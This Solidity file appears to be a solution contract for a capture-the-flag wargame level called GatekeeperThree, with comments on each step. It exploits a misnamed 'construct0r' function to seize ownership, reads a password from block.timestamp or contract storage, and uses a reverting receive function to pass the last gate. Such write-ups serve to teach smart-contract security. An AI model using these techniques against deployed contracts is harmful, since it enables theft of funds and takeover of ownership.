// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./GatekeeperThree.sol";

contract GatekeeperThreeHack {
  GatekeeperThree public gatekeeperThreeContract;
  address public owner;
  uint public gatePassword;

  constructor(address _target) {
    owner = msg.sender;
    gatekeeperThreeContract = GatekeeperThree(payable(address(_target)));
  }

  modifier ownerOnly() {
    require(msg.sender == owner);
    _;
  }

  function enterGate() public ownerOnly {
    // Our function to attack the gate after we set up with functions below
    require(gatekeeperThreeContract.enter(), 'Enter failed');
  }


  function claimOwnership() public {
    // Claim ownership of gatekeeper three by caling bad construct0r function
    // This will get us gate one.
    gatekeeperThreeContract.construct0r();
  }

  function generateTrick() public ownerOnly {
    // Create a trick and set password to block.timestamp
    // as the SimpleTrick will. We will see if this matches, if not we will
    // Add a function to update password and we can just peek at it by reading
    // Storage w/ cast storage instead
    gatekeeperThreeContract.createTrick();
    gatePassword = block.timestamp;
  }

  function updatedPassword(uint _password) public ownerOnly {
    gatePassword = _password;
  }

  function submitPassword() public ownerOnly {
    // This along with our createingTrick/ updating password should ge tus gate two
    gatekeeperThreeContract.getAllowance(gatePassword);
  }

  // Gate three will receive a send payment and return false to pass.
  // We(attack contract) are owner becasue we called bad construct0r
  // Can see fallback of send functions here based on type of send,
  // We will setup a receive
  receive () external payable {
    // Only accept if not owner so we can still send
    if(!(msg.sender == owner)) {
      revert();
    }
  }
}